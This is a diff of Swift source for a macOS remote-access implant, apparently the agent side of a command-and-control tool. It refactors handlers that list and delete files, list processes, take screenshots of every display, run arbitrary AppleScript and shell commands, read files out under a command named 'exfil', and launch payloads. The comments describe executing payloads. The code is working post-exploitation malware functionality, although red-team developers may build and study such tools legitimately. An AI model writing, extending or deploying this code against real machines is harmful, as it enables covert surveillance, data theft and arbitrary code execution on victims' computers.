@@ -44,192 +44,211 @@ struct Command {
   }
 }
 
+public enum CmdError: Error {
+  case noCommand
+  case notEnoughArguments(String)
+  case invalidArgument(String)
+  case displyList(CGError)
+  case osascript(NSDictionary)
+  case zshFailure
+}
+
 public enum CmdValue {
   case string(String)
   case data(Data)
+  case screenshots(timestamp: String, screenshots: [Data])
 }
 
 public typealias CmdResult = Result<CmdValue, Error>
 
 public class ASH {
   static let fileManager = FileManager.default
+  static let shared = ASH()
 
-//  func lsCommand() -> CmdResult {
-//    let path = ASH.fileManager.currentDirectoryPath
-//    do {
-//      let listPaths = try ASH.fileManager.contentsOfDirectory(atPath: path).joined(separator: "\n")
-//      return .success(.string("\(path)\n\(listPaths)"))
-//    }
-//    catch {
-//      return .failure(error)
-//    }
-//  }
-//  
-//  func cdCommand(_ destPath: String) -> CmdResult {
-//    
-//  }
+  func lsCommand() -> CmdResult {
+    let path = ASH.fileManager.currentDirectoryPath
+    do {
+      let listPaths = try ASH.fileManager.contentsOfDirectory(atPath: path).joined(separator: "\n")
+      return .success(.string("\(path)\n\(listPaths)"))
+    }
+    catch {
+      return .failure(error)
+    }
+  }
 
-  public func command(command: String) -> NSDictionary {
-    guard let cmd = Command(command)
-    else { return returnData(inCommand: "Null", returnType: "Error", returnData: "No commands were passed").returnDict as NSDictionary }
-    
-    let commandString = cmd.command.rawValue
-    switch cmd.command {
-    case .ls:
-      let path = ASH.fileManager.currentDirectoryPath
-      do {
-        let listPaths = try ASH.fileManager.contentsOfDirectory(atPath: path).joined(separator: "\n")
-        let commandResult = "\(path)\n\(listPaths)"
-        return returnData(inCommand: commandString, returnType: "String", returnData: commandResult).returnDict as NSDictionary
-      }
-      catch {
-        return returnData(inCommand: commandString, returnType: "Error", returnData: error).returnDict as NSDictionary
-      }
-    case .cd:
-      //Changes directory
-      var newDirPath = ""
-      if #available(macOS 10.12, *) {
-        newDirPath = cmd.filePath ?? ASH.fileManager.homeDirectoryForCurrentUser.path
-      } else {
-        // Fallback on earlier versions
-        newDirPath = cmd.filePath ?? ASH.fileManager.currentDirectoryPath
-      }
-      ASH.fileManager.changeCurrentDirectoryPath(newDirPath)
-      return returnData(inCommand: commandString, returnType: "String", returnData: newDirPath).returnDict as NSDictionary
-    case .cdr:
-        //Go to the relative folder in this directory
-        ASH.fileManager.changeCurrentDirectoryPath(cmd.fullpath)
-        return returnData(inCommand: commandString, returnType: "String", returnData: cmd.fullpath).returnDict as NSDictionary
-    case .mkdir:
-      do {
-        try ASH.fileManager.createDirectory(at: URL(fileURLWithPath: cmd.fullpath), withIntermediateDirectories: false, attributes: nil)
-        return returnData(inCommand: commandString, returnType: "String", returnData: cmd.fullpath).returnDict as NSDictionary
-      }
-      catch {
-        return returnData(inCommand: commandString, returnType: "Error", returnData: error).returnDict as NSDictionary
-      }
-    case .whoami:
-        //Do Get username
-      return returnData(inCommand: commandString, returnType: "String", returnData: NSUserName()).returnDict as NSDictionary
-    case .rm:
-        //Delete a file
-        do {
-          try ASH.fileManager.removeItem(at: URL(fileURLWithPath: cmd.fullpath))
-          return returnData(inCommand: commandString, returnType: "String", returnData: cmd.fullpath).returnDict as NSDictionary
-        }
-        catch {
-          return returnData(inCommand: commandString, returnType: "Error", returnData: error).returnDict as NSDictionary
-        }
-    case .ps:
-        //Will list all processes
-      let commandResult = NSWorkspace.shared.runningApplications.compactMap(\.localizedName).joined(separator: "\n")
-      return returnData(inCommand: commandString, returnType: "String", returnData: commandResult).returnDict as NSDictionary
-    case .cat:
-      do {
-        let fileResults = try String(contentsOf: URL(fileURLWithPath: cmd.fullpath), encoding: .utf8)
-        return returnData(inCommand: commandString, returnType: "String", returnData: fileResults).returnDict as NSDictionary
-      }
-      catch {
-        return returnData(inCommand: commandString, returnType: "Error", returnData: error).returnDict as NSDictionary
-      }
-    case .mv:
-      guard cmd.arguments.count > 1 else { return returnData(inCommand: commandString, returnType: "Error", returnData: "no enough arguments").returnDict as NSDictionary }
-      let origUrl = URL(fileURLWithPath: cmd.arguments[0])
-      let destURL = URL(fileURLWithPath: cmd.arguments[1])
-      //Move a file.  This will delete the previous file
-      do {
-        try ASH.fileManager.copyItem(at: origUrl, to: destURL)
+  func cdCommand(_ destPath: String?) -> CmdResult {
+    var newDirPath = ""
+    if #available(macOS 10.12, *) {
+      newDirPath = destPath ?? ASH.fileManager.homeDirectoryForCurrentUser.path
+    } else {
+      // Fallback on earlier versions
+      newDirPath = destPath ?? ASH.fileManager.currentDirectoryPath
+    }
+    ASH.fileManager.changeCurrentDirectoryPath(newDirPath)
+    return .success(.string(newDirPath))
+  }
+  
+  func mkdirCommand(_ destPath: String) -> CmdResult {
+    do {
+      try ASH.fileManager.createDirectory(at: URL(fileURLWithPath: destPath), withIntermediateDirectories: false, attributes: nil)
+      return .success(.string(destPath))
+    }
+    catch {
+      return .failure(error)
+    }
+  }
+  
+  func rmCommand(_ targetPath: String) -> CmdResult {
+    do {
+      try ASH.fileManager.removeItem(at: URL(fileURLWithPath: targetPath))
+      return .success(.string(targetPath))
+    }
+    catch {
+      return .failure(error)
+    }
+  }
+  
+  func psCommand() -> CmdResult {
+    let commandResult = NSWorkspace.shared.runningApplications.compactMap(\.localizedName).joined(separator: "\n")
+    return .success(.string(commandResult))
+  }
+  
+  func catCommand(_ targetFile: String) -> CmdResult {
+    do {
+      let fileResults = try String(contentsOf: URL(fileURLWithPath: targetFile), encoding: .utf8)
+      return .success(.string(fileResults))
+    }
+    catch {
+      return .failure(error)
+    }
+  }
+  
+  func mvCommand(from srcPath: String, to destPath: String) -> CmdResult {
+    let origUrl = URL(fileURLWithPath: srcPath)
+    let destURL = URL(fileURLWithPath: destPath)
+    //Move a file.  This will delete the previous file
+    do {
+      try ASH.fileManager.copyItem(at: origUrl, to: destURL)
 //            try ASH.fileManager.copyItem(atPath: String(origDir!), toPath: String(destDir!))
-        try ASH.fileManager.removeItem(at: origUrl)
-        return returnData(inCommand: commandString, returnType: "String", returnData: "\(origUrl.path) >  \(destURL.path)").returnDict as NSDictionary
-      }
-      catch {
-        return returnData(inCommand: commandString, returnType: "Error", returnData: error).returnDict as NSDictionary
-      }
+      try ASH.fileManager.removeItem(at: origUrl)
+      return .success(.string("\(origUrl.path) >  \(destURL.path)"))
+    }
+    catch {
+      return .failure(error)
+    }
+  }
+  
+  func stringsCmd(_ filePath: String) -> CmdResult {
+    let file = URL(fileURLWithPath: filePath)
+    do {
+      let fileResults = try String(contentsOf: file, encoding: .ascii)
+      return .success(.string(fileResults))
+    }
+    catch {
+      return .failure(error)
+    }
+  }
+  
+  func cpCommand(from srcPath: String, to dstPath: String) -> CmdResult {
+    let origUrl = URL(fileURLWithPath: srcPath)
+    let destURL = URL(fileURLWithPath: dstPath)
+
+    do {
+      try ASH.fileManager.copyItem(at: origUrl, to: destURL)
+      return .success(.string("\(origUrl.path) > \(destURL.path)"))
+    }
+    catch {
+      return .failure(error)
+    }
+  }
+  
+  func screenshotCommand() -> CmdResult {
+    var displayCount: UInt32 = 0
+    let displayList = CGGetActiveDisplayList(0, nil, &displayCount)
+    let capacity = Int(displayCount)
+    var activeDisplay = Array<CGDirectDisplayID>(repeating: 0, count: capacity)
+    guard displayList == CGError.success,
+          CGGetActiveDisplayList(displayCount, &activeDisplay, &displayCount) == CGError.success
+    else { return .failure(CmdError.displyList(displayList)) }
+      //Places all the displays into an object
+    let screenshotTime = "\(Date().timeIntervalSince1970)"
+    let screenshots: [Data] = (0..<Int(displayCount)).compactMap { displayIdx in
+      guard let screenshot: CGImage = CGDisplayCreateImage(activeDisplay[displayIdx]),
+            let jpg = NSBitmapImageRep(cgImage: screenshot).representation(using: .jpeg, properties: [:])
+      else { return nil }
+      return jpg
+    }
+    return .success(.screenshots(timestamp: screenshotTime, screenshots: screenshots))
+  }
+  
+  func osascriptCommand(_ script: String) -> CmdResult {
+    let scriptOutput = NSAppleScript(source: script)!
+    var scriptErr: NSDictionary?
+    scriptOutput.executeAndReturnError(&scriptErr)
+    return scriptErr == nil ? .success(.string(script)) : .failure(CmdError.osascript(scriptErr!))
+  }
+  
+  func exfilCommand(_ filePath: String) -> CmdResult {
+    guard ASH.fileManager.fileExists(atPath: filePath) else { return .failure(CmdError.invalidArgument("File \(filePath) does not exist")) }
+    do {
+      let data = try Data(contentsOf: URL(fileURLWithPath: filePath))
+      return .success(.data(data))
+    }
+    catch {
+      return .failure(error)
+    }
+  }
+  
+  func executeCommand(_ command: String) -> CmdResult {
+    do {
+      try NSWorkspace.shared.launchApplication(at: URL(fileURLWithPath: command), options: .default, configuration: .init())
+      return .success(.string("\(command) successful"))
+    }
+    catch {
+      return .failure(error)
+    }
+
+  }
+
+  public func command(command: String) -> CmdResult {
+    guard let cmd = Command(command) else { return .failure(CmdError.noCommand) }
+    
+    switch cmd.command {
+    case .ls: return lsCommand()
+    case .cd: return cdCommand(cmd.filePath)
+    case .cdr: return cdCommand(cmd.fullpath)         //Go to the relative folder in this directory
+    case .mkdir: return mkdirCommand(cmd.fullpath)
+    case .whoami: return .success(.string(NSUserName())) //Do Get username
+    case .rm: return rmCommand(cmd.fullpath)
+    case .ps: return psCommand() //Will list all processes -- not quite correct, need to clarify
+    case .cat: return catCommand(cmd.fullpath)
+    case .mv:
+      guard cmd.arguments.count > 1 else { return .failure(CmdError.notEnoughArguments("mv requires source and destination arguments")) }
+      return mvCommand(from: cmd.arguments[0], to: cmd.arguments[1])
     case .strings:
       // TODO: - Rewrite this to actually replicate strings functionality
-      let file = URL(fileURLWithPath: cmd.fullpath)
-      do {
-        let fileResults = try String(contentsOf: file, encoding: .ascii)
-        return returnData(inCommand: commandString, returnType: "String", returnData:fileResults).returnDict as NSDictionary
-      }
-      catch {
-        return returnData(inCommand: commandString, returnType: "Error", returnData: error).returnDict as NSDictionary
-      }
+      return stringsCmd(cmd.fullpath)
     case .cp:
       //Copy a file
-      guard cmd.arguments.count > 1 else { return returnData(inCommand: commandString, returnType: "Error", returnData: "no enough arguments").returnDict as NSDictionary }
-//      let commandSplit = command.components(separatedBy: "; ")[safe: 1]
-//      if commandSplit != nil {
-//        let directories = commandSplit!.split(separator: " ")
-//        let origDir = directories[safe: 0]
-//        let destDir = directories[safe: 1]
-//        if origDir != nil && destDir != nil {
-      let origUrl = URL(fileURLWithPath: cmd.arguments[0])
-      let destURL = URL(fileURLWithPath: cmd.arguments[1])
-
-      do {
-        try ASH.fileManager.copyItem(at: origUrl, to: destURL)
-        return returnData(inCommand: commandString, returnType: "String", returnData: "\(origUrl.path) > \(destURL.path)").returnDict as NSDictionary
-      }
-      catch {
-        return returnData(inCommand: commandString, returnType: "Error", returnData: error).returnDict as NSDictionary
-      }
+      guard cmd.arguments.count > 1 else { return .failure(CmdError.notEnoughArguments("cp requires source and destination arguments")) }
+      return cpCommand(from: cmd.arguments[0], to: cmd.arguments[1])
     case .screenshot:
       //Gets overall displays
       //Some bugs exist with this command
       //For example, it doesn't cycle through virtual desktops and will screenshot a random one
       //This will notify the user requesting permission to take pictures on 10.15+
-      var displayCount: UInt32 = 0
-      var displayList = CGGetActiveDisplayList(0, nil, &displayCount)
-      if displayList == CGError.success {
-        //Places all the displays into an object
-        let capacity = Int(displayCount)
-//          let activeDisplay = UnsafeMutablePointer<CGDirectDisplayID>.allocate(capacity: capacity)
-        var activeDisplay = Array<CGDirectDisplayID>(repeating: 0, count: capacity) //UnsafeMutablePointer<CGDirectDisplayID>.allocate(capacity: capacity)
-        displayList = CGGetActiveDisplayList(displayCount, &activeDisplay, &displayCount)
-        if displayList == CGError.success {
-          // This currently only returns the screenshot for the first display in the array
-          // TODO: - Return full array of shots
-          for singleDisplay in 0..<Int(displayCount) {
-            let screenshotTime = Date().timeIntervalSince1970
-            let screenshot: CGImage = CGDisplayCreateImage(activeDisplay[singleDisplay])!
-            let bitmap = NSBitmapImageRep(cgImage: screenshot)
-            let screenshotData = bitmap.representation(using: .jpeg, properties: [:])!
-            return returnDataRaw(inCommand: commandString, returnType: "Image", fileName: "\(screenshotTime).jpg", returnData: screenshotData).returnDict as NSDictionary
-          }
-        }
-      }
+      return screenshotCommand()
     case .osascript:
-      guard let source = cmd.arguments.first else { return returnData(inCommand: commandString, returnType: "Error", returnData: "No script provided").returnDict as NSDictionary }
-        let scriptOutput = NSAppleScript(source: source)!
-        var scriptErr: NSDictionary?
-        scriptOutput.executeAndReturnError(&scriptErr)
-        if let scriptErr = scriptErr {
-          return returnData(inCommand: commandString, returnType: "Error", returnData: scriptErr).returnDict as NSDictionary
-        } else {
-          return returnData(inCommand: commandString, returnType: "String", returnData: source).returnDict as NSDictionary
-        }
+      guard let source = cmd.arguments.first else { return .failure(CmdError.notEnoughArguments("No script provided ot oscscript command")) }
+        return osascriptCommand(source)
     case .exfil:
       guard ASH.fileManager.fileExists(atPath: cmd.fullpath)
-      else { return returnData(inCommand: commandString, returnType: "Error", returnData: "File doesn't exist").returnDict as NSDictionary }
-      do {
-        let data = try Data(contentsOf: URL(fileURLWithPath: cmd.fullpath))
-        return returnDataRaw(inCommand: commandString, returnType: "Data", fileName: cmd.filePath ?? "", returnData: data).returnDict as NSDictionary
-      }
-      catch {
-        return returnData(inCommand: commandString, returnType: "Error", returnData: error).returnDict as NSDictionary
-      }
+      else { return .failure(CmdError.invalidArgument("File \(cmd.fullpath) does not exist")) }
+      return exfilCommand(cmd.fullpath)
     case .execute:
       //Will execute payloads, this typically works better when you're in the same directory as the destination payload
-      guard let commandSplit = cmd.arguments.first else { return returnData(inCommand: commandString, returnType: "Error", returnData: "No arguments passed to execute command").returnDict as NSDictionary }
-      do {
-        try NSWorkspace.shared.launchApplication(at: URL(fileURLWithPath: commandSplit), options: .default, configuration: .init())
-        return returnData(inCommand: commandString, returnType: "String", returnData: "\(command) successful").returnDict as NSDictionary
-      }
-      catch {
-        return returnData(inCommand: commandString, returnType: "Error", returnData: error).returnDict as NSDictionary
-      }
+      guard let command = cmd.arguments.first else { return .failure(CmdError.notEnoughArguments("No arguments passed to execute command")) }
+      return executeCommand(command)
     case .man:
         let commandResult = """
                     The following are commands ran as API calls:
@@ -247,7 +266,7 @@ public class ASH {
                     exfil; <binary> --- Will grab the raw data of a file. Must be in the same directory of the file.
                     execute; <App to Run> --- This will execute a payload as an API call (no shell needed). Must be in the directory of the binary to execute.
                     """
-        return returnData(inCommand: commandString, returnType: "String", returnData: commandResult).returnDict as NSDictionary
+      return .success(.string(commandResult))
       default:
         let shell = Process()
         let output = Pipe()
@@ -258,13 +277,11 @@ public class ASH {
         shell.launch()
         shell.waitUntilExit()
         let data = output.fileHandleForReading.readDataToEndOfFile()
-        let newOutput = String(data: data, encoding: .utf8)
-        return returnData(inCommand: commandString, returnType: "String", returnData: newOutput!).returnDict as NSDictionary
+        if let newOutput = String(data: data, encoding: .utf8) {
+          return .success(.string(newOutput))
+        } else {
+          return .failure(CmdError.zshFailure)
+        }
       }
-//    }
-//    else {
-//      return returnData(inCommand: "Null", returnType: "Error", returnData: "No commands were passed").returnDict as NSDictionary
-//    }
-    return returnData(inCommand: command, returnType: "Error", returnData: "Nothing matched the command").returnDict as NSDictionary
   }
 }
